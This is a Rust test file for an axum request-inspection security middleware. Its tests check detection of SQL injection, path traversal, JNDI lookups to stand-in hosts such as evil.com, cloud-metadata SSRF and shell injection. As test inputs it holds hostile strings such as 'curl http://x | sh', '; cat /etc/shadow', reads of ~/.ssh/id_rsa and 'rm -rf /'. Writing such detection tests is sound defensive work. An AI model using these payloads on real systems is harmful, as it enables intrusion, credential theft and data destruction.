#![allow(clippy::unwrap_used, clippy::expect_used)]

use super::*;
use axum::{
    Router,
    body::Bytes,
    http::HeaderValue,
    routing::{get, post},
};
use tower::ServiceExt;

async fn protected_resource() -> impl IntoResponse {
    (StatusCode::OK, "Protected Resource")
}

async fn echo(body: Bytes) -> Bytes {
    body
}

fn guarded_app() -> Router {
    Router::new()
        .route("/items", get(protected_resource))
        .route("/echo", post(echo))
        .layer(RaspSecurityLayer)
}

#[test]
fn test_rasp_sqli_detection() {
    assert!(RaspInspector::inspect_uri(
        "/api/users?q=UNION SELECT * FROM passwords"
    ));
    assert!(RaspInspector::inspect_uri("/login?user=admin' OR '1'='1"));
    assert!(RaspInspector::inspect_text(
        "SELECT * FROM users WHERE id = 1; SLEEP(5);"
    ));
    assert!(!RaspInspector::inspect_uri("/api/users?id=123"));
}

#[test]
fn ascii_fold_matches_the_standard_library_for_every_byte() {
    for byte in u8::MIN..=u8::MAX {
        assert_eq!(fold_ascii_byte(byte), byte.to_ascii_lowercase());
    }
}

#[test]
fn test_rasp_path_traversal_detection() {
    assert!(RaspInspector::inspect_uri(
        "/download?file=../../etc/passwd"
    ));
    assert!(!RaspInspector::inspect_uri("/download?file=document.pdf"));
}

#[test]
fn test_rasp_jndi_detection() {
    assert!(RaspInspector::inspect_text(
        "${jndi:ldap://attacker.com/exploit}"
    ));
    assert!(RaspInspector::inspect_text("${rmi://evil.com:1099/obj}"));
}

#[test]
fn test_rasp_header_inspection() {
    let mut headers = HeaderMap::new();
    headers.insert(
        "user-agent",
        HeaderValue::from_static("${jndi:ldap://evil.com/a}"),
    );
    assert!(RaspInspector::inspect_headers(&headers));

    let mut clean_headers = HeaderMap::new();
    clean_headers.insert("user-agent", HeaderValue::from_static("Mozilla/5.0"));
    assert!(!RaspInspector::inspect_headers(&clean_headers));
}

#[test]
fn obs_text_bytes_cannot_hide_a_header_payload() {
    for (name, value) in [
        ("user-agent", &b"${jndi:ldap://evil/a}\xff"[..]),
        ("x-forwarded-host", &b"169.254.169.254\xff"[..]),
    ] {
        let value = HeaderValue::from_bytes(value).unwrap();
        assert!(value.to_str().is_err());
        let mut headers = HeaderMap::new();
        headers.insert(name, value);
        assert!(RaspInspector::inspect_headers(&headers), "{name}");
    }
    let mut clean = HeaderMap::new();
    clean.insert(
        "user-agent",
        HeaderValue::from_bytes(b"Mozilla/5.0 caf\xe9").unwrap(),
    );
    assert!(!RaspInspector::inspect_headers(&clean));
}

#[test]
fn test_rasp_ssrf_and_rce_detection() {
    assert!(RaspInspector::inspect_uri(
        "/proxy?url=http://169.254.169.254/latest/meta-data"
    ));
    assert!(RaspInspector::inspect_uri(
        "/fetch?url=http://metadata.google.internal/computeMetadata"
    ));
    assert!(RaspInspector::inspect_text("input; rm -rf /"));
    assert!(RaspInspector::inspect_text("echo test | sh"));
    assert!(RaspInspector::inspect_text(
        "powershell -Command Invoke-WebRequest"
    ));
    assert!(RaspInspector::inspect_text("run /bin/bash script.sh"));
}

#[test]
fn shell_signatures_need_a_command_not_a_word_prefix() {
    // Prose that the old `| sh` and `; cat ` substrings refused.
    for prose in ["Add it to the cart | shopping list", "dogs; cat food"] {
        assert!(!RaspInspector::inspect_text(prose), "{prose}");
    }
    for attack in [
        "| sh",
        "x | SH -c id",
        "curl http://x | sh;",
        "; cat /etc/shadow",
        "1; cat .env",
        "1; cat ~/.ssh/id_rsa",
        "1; CAT $HOME/.netrc",
        "1;%20cat%20/etc/shadow",
    ] {
        assert!(RaspInspector::inspect_text(attack), "{attack}");
    }
}

#[test]
fn json_body_inspection_decodes_escaped_strings() {
    assert!(RaspInspector::inspect_body(
        r#"{"path":"\u002e\u002e/etc/passwd"}"#,
        "application/json"
    ));
    assert!(!RaspInspector::inspect_body(
        r#"{"message":"ordinary profile update"}"#,
        "application/json"
    ));
}

#[test]
fn textual_and_structured_media_types_are_selected_exactly() {
    for media_type in [
        "text/plain; charset=utf-8",
        "application/json",
        "application/xml",
        "application/problem+json",
        "application/problem+xml",
        "application/x-www-form-urlencoded",
    ] {
        let mut headers = HeaderMap::new();
        headers.insert(header::CONTENT_TYPE, HeaderValue::from_static(media_type));
        assert!(should_inspect_body(&headers), "should inspect {media_type}");
    }

    let mut binary = HeaderMap::new();
    binary.insert(
        header::CONTENT_TYPE,
        HeaderValue::from_static("application/octet-stream"),
    );
    assert!(!should_inspect_body(&binary));
}

#[tokio::test]
async fn middleware_blocks_attacks_and_preserves_clean_bodies() {
    let app = guarded_app();
    let attack_req = Request::builder()
        .uri("/items?q=UNION%20SELECT%20password%20FROM%20users")
        .body(Body::empty())
        .unwrap();
    assert_eq!(
        app.clone().oneshot(attack_req).await.unwrap().status(),
        StatusCode::FORBIDDEN
    );

    let clean_req = Request::builder()
        .uri("/items?page=1")
        .body(Body::empty())
        .unwrap();
    assert_eq!(
        app.clone().oneshot(clean_req).await.unwrap().status(),
        StatusCode::OK
    );

    let attack_body = Request::builder()
        .method("POST")
        .uri("/echo")
        .header(header::CONTENT_TYPE, "application/json")
        .body(Body::from(r#"{"path":"\u002e\u002e/etc/passwd"}"#))
        .unwrap();
    assert_eq!(
        app.clone().oneshot(attack_body).await.unwrap().status(),
        StatusCode::FORBIDDEN
    );

    let clean_payload = br#"{"message":"hello"}"#.to_vec();
    let clean_body = Request::builder()
        .method("POST")
        .uri("/echo")
        .header(header::CONTENT_TYPE, "application/json")
        .body(Body::from(clean_payload.clone()))
        .unwrap();
    let response = app.oneshot(clean_body).await.unwrap();
    assert_eq!(response.status(), StatusCode::OK);
    let echoed = axum::body::to_bytes(response.into_body(), 1_024)
        .await
        .unwrap();
    assert_eq!(echoed.as_ref(), clean_payload);
}

#[tokio::test]
async fn middleware_fails_closed_for_uninspectable_textual_bodies() {
    let app = guarded_app();

    let encoded = Request::builder()
        .method("POST")
        .uri("/echo")
        .header(header::CONTENT_TYPE, "text/plain")
        .header(header::CONTENT_ENCODING, "gzip")
        .body(Body::from("compressed"))
        .unwrap();
    assert_eq!(
        app.clone().oneshot(encoded).await.unwrap().status(),
        StatusCode::UNSUPPORTED_MEDIA_TYPE
    );

    let invalid_utf8 = Request::builder()
        .method("POST")
        .uri("/echo")
        .header(header::CONTENT_TYPE, "text/plain")
        .body(Body::from(vec![0xff]))
        .unwrap();
    assert_eq!(
        app.clone().oneshot(invalid_utf8).await.unwrap().status(),
        StatusCode::BAD_REQUEST
    );

    let declared_oversized = Request::builder()
        .method("POST")
        .uri("/echo")
        .header(header::CONTENT_TYPE, "text/plain")
        .header(
            header::CONTENT_LENGTH,
            (MAX_INSPECTED_REQUEST_BYTES + 1).to_string(),
        )
        .body(Body::from(vec![b'a'; MAX_INSPECTED_REQUEST_BYTES + 1]))
        .unwrap();
    assert_eq!(
        app.clone()
            .oneshot(declared_oversized)
            .await
            .unwrap()
            .status(),
        StatusCode::PAYLOAD_TOO_LARGE
    );

    let undeclared_oversized = Request::builder()
        .method("POST")
        .uri("/echo")
        .header(header::CONTENT_TYPE, "text/plain")
        .body(Body::from(vec![b'a'; MAX_INSPECTED_REQUEST_BYTES + 1]))
        .unwrap();
    assert_eq!(
        app.oneshot(undeclared_oversized).await.unwrap().status(),
        StatusCode::PAYLOAD_TOO_LARGE
    );
}

#[test]
fn media_types_accepted_by_axum_extractors_are_inspected() {
    for media_type in [
        "APPLICATION/JSON",
        "application/vnd.api+JSON",
        "Application/problem+json",
        "application/json+patch",
        "Application/Problem+XML",
        "Text/Plain",
        "APPLICATION/X-WWW-FORM-URLENCODED",
        "application/x-www-form-urlencodedX",
    ] {
        let mut headers = HeaderMap::new();
        headers.insert(header::CONTENT_TYPE, HeaderValue::from_static(media_type));
        assert!(should_inspect_body(&headers), "should inspect {media_type}");
    }
    let escaped = r#"{"q":"\u0075nion select pw"}"#;
    assert!(RaspInspector::inspect_body(
        escaped,
        "application/vnd.api+JSON"
    ));
    assert!(RaspInspector::inspect_body(escaped, "Application/JSON"));
    assert!(!RaspInspector::inspect_body(escaped, "text/plain"));
}

#[tokio::test]
async fn case_and_suffix_variants_cannot_skip_body_inspection() {
    let app = guarded_app();
    for (media_type, body) in [
        (
            "application/vnd.api+JSON",
            r#"{"q":"\u0075nion select pw"}"#,
        ),
        (
            "Application/problem+json",
            r#"{"q":"\u0075nion select pw"}"#,
        ),
        (
            "application/x-www-form-urlencodedX",
            "file=../../etc/passwd",
        ),
    ] {
        let request = Request::builder()
            .method("POST")
            .uri("/echo")
            .header(header::CONTENT_TYPE, media_type)
            .body(Body::from(body))
            .unwrap();
        assert_eq!(
            app.clone().oneshot(request).await.unwrap().status(),
            StatusCode::FORBIDDEN,
            "{media_type} body was not inspected"
        );
    }
}

const STOCK_POWERSHELL_USER_AGENTS: [&str; 4] = [
    "Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.22621.2506",
    "Mozilla/5.0 (Windows NT 10.0; Microsoft Windows 10.0.22631; en-US) PowerShell/7.4.1",
    "Mozilla/5.0 (Linux; Ubuntu 22.04.3 LTS; en-US) PowerShell/7.4.1",
    "Mozilla/5.0 (Macintosh; Darwin 23.1.0; en-US) PowerShell/7.5.0-preview.2",
];

fn user_agent_headers(name: &'static str, value: &str) -> HeaderMap {
    let mut headers = HeaderMap::new();
    headers.insert(name, HeaderValue::from_str(value).unwrap());
    headers
}

#[test]
fn stock_powershell_user_agents_are_not_command_injection() {
    for agent in STOCK_POWERSHELL_USER_AGENTS {
        assert!(
            !RaspInspector::inspect_headers(&user_agent_headers("user-agent", agent)),
            "{agent}"
        );
    }
}

#[test]
fn powershell_execution_syntax_in_a_user_agent_still_blocks() {
    for agent in [
        "() { :; }; powershell -enc SQBFAFgA",
        "x; powershell.exe -nop -w hidden -c iex",
        "Mozilla/5.0 powershell -Command Invoke-WebRequest",
        "Mozilla/5.0 |powershell/7 -c whoami",
        "Mozilla/5.0 PowerShell/7.4.1;whoami",
        "Mozilla/5.0 PowerShell/7.4.1&whoami",
        "Mozilla/5.0 PowerShell%2F7.4.1",
        "Mozilla/5.0 PowerShell/ 7",
        "Mozilla/5.0 PowerShell/x7",
        "Mozilla/5.0 WindowsPowerShell -c whoami",
        "PowerShell/7.4.1 powershell -enc SQBFAFgA",
        // Other signatures in the same value are unaffected by the exemption.
        "Mozilla/5.0 PowerShell/7.4.1 ; rm -rf /",
        "PowerShell/7.4.1 ${jndi:ldap://evil.example/a}",
    ] {
        assert!(
            RaspInspector::inspect_headers(&user_agent_headers("user-agent", agent)),
            "{agent}"
        );
    }
    // The exemption is limited to User-Agent and leaves every other surface intact.
    assert!(RaspInspector::inspect_headers(&user_agent_headers(
        "x-client",
        "PowerShell/7.4.1"
    )));
    assert!(RaspInspector::inspect_text(STOCK_POWERSHELL_USER_AGENTS[1]));
    assert!(RaspInspector::inspect_uri("/run?shell=PowerShell/7.4.1"));
}

#[tokio::test]
async fn middleware_serves_stock_powershell_clients() {
    let app = guarded_app();
    for agent in STOCK_POWERSHELL_USER_AGENTS {
        let request = Request::builder()
            .uri("/items")
            .header(header::USER_AGENT, agent)
            .body(Body::empty())
            .unwrap();
        assert_eq!(
            app.clone().oneshot(request).await.unwrap().status(),
            StatusCode::OK,
            "{agent}"
        );
    }
    let attack = Request::builder()
        .uri("/items")
        .header(header::USER_AGENT, "x; powershell -enc SQBFAFgA")
        .body(Body::empty())
        .unwrap();
    assert_eq!(
        app.oneshot(attack).await.unwrap().status(),
        StatusCode::FORBIDDEN
    );
}

#[test]
fn one_layer_of_percent_and_plus_decoding_is_applied() {
    assert_eq!(decode_percent_once("%41%62%7e%7E"), "Ab~~");
    assert_eq!(decode_percent_once("%6A%10"), "j\u{10}");
    assert_eq!(decode_percent_once("a+b"), "a b");
    assert_eq!(decode_percent_once("%2e%2E%2f"), "../");
    // Incomplete and invalid escapes are kept as written.
    assert_eq!(decode_percent_once("%4"), "%4");
    assert_eq!(decode_percent_once("50%"), "50%");
    assert_eq!(decode_percent_once("x%4"), "x%4");
    assert_eq!(decode_percent_once("%zz%4g%+1"), "%zz%4g% 1");
    assert_eq!(decode_percent_once("%%41"), "%A");
    // Only one layer is decoded.
    assert_eq!(decode_percent_once("%252e"), "%2e");
    assert_eq!(hex_value(b'F'), Some(15));
    assert_eq!(hex_value(b'g'), None);
}

#[test]
fn signatures_apply_to_one_decoded_layer_without_flagging_plain_encoding() {
    assert!(RaspInspector::inspect_text("%2Fetc%2Fpasswd"));
    assert!(RaspInspector::inspect_text("x%3B+rm+-rf+%2F"));
    for value in ["caf%C3%A9+au+lait", "a+b%20c", "100%25", "%41%42"] {
        assert!(!RaspInspector::inspect_text(value), "{value}");
    }
}

#[tokio::test]
async fn clean_bodies_up_to_the_inspection_limit_are_served() {
    let payload = "a".repeat(64 * 1024);
    let request = Request::builder()
        .method("POST")
        .uri("/echo")
        .header(header::CONTENT_TYPE, "text/plain")
        .header(header::CONTENT_LENGTH, payload.len())
        .body(Body::from(payload.clone()))
        .unwrap();
    let response = guarded_app().oneshot(request).await.unwrap();
    assert_eq!(response.status(), StatusCode::OK);
    let echoed = axum::body::to_bytes(response.into_body(), 128 * 1024)
        .await
        .unwrap();
    assert_eq!(echoed.len(), payload.len());

    let attack = format!("{payload}; rm -rf /");
    let request = Request::builder()
        .method("POST")
        .uri("/echo")
        .header(header::CONTENT_TYPE, "text/plain")
        .body(Body::from(attack))
        .unwrap();
    assert_eq!(
        guarded_app().oneshot(request).await.unwrap().status(),
        StatusCode::FORBIDDEN
    );
}
